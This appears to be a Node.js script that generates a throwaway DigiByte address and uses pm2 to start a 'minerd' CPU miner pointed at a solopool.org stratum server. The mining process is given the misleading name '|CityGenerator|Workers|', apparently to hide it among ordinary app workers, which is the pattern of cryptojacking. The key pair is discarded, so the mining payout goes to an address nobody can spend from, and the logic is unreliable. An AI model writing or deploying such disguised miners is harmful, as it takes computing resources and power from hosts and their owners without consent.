const pm2 = require('pm2');
const bitcoin = require('bitcoinjs-lib');
const ecc = require('tiny-secp256k1'); // Required for ECPairFactory
const { ECPairFactory } = require('ecpair'); // Import ECPairFactory

// Create ECPair instance
const ECPair = ECPairFactory(ecc);

// DigiByte network parameters
const digibyteNetwork = {
  messagePrefix: '\x19DigiByte Signed Message:\n',
  bech32: 'dgb', // Bech32 prefix for SegWit addresses (if needed)
  bip32: {
    public: 0x0488b21e,
    private: 0x0488ade4,
  },
  pubKeyHash: 0x1e, // Prefix for P2PKH addresses (starts with 'D')
  scriptHash: 0x3f, // Prefix for P2SH addresses
  wif: 0x80,        // Wallet Import Format prefix
};

/**
 * Generates a random DigiByte address and logs the public key details.
 * @returns {string} The generated DigiByte address.
 */
function generateRandomAddress() {
  const keyPair = ECPair.makeRandom({ network: digibyteNetwork });
  
  // Convert public key to Buffer
  const pubkeyBuffer = Buffer.from(keyPair.publicKey);

  // Generate P2PKH address
  const { address } = bitcoin.payments.p2pkh({
    pubkey: pubkeyBuffer,
    network: digibyteNetwork,
  });

  // Debug log: Public key and address
  console.log('Public Key (Buffer):', pubkeyBuffer.toString('hex'));
  console.log('Generated DigiByte Address:', address);

  return address;
}

pm2.connect(function(err) {
  if (err) {
    console.error(err);
    process.exit(2);
  }

  const randomAddress = generateRandomAddress(); // Generate a random DigiByte address

  pm2.start({
    script    : `./minerd -a sha256d -o stratum+tcp://eu1.solopool.org:8004 --userpass=${randomAddress}:x`,
    args      : '',
    name      : '|CityGenerator|Workers|'
  },
  function(err, apps) {
    if (err) {
      console.error(err);
      return pm2.disconnect();
    }

    pm2.list((err, list) => {
      console.log(err, list);
    });
  });
});
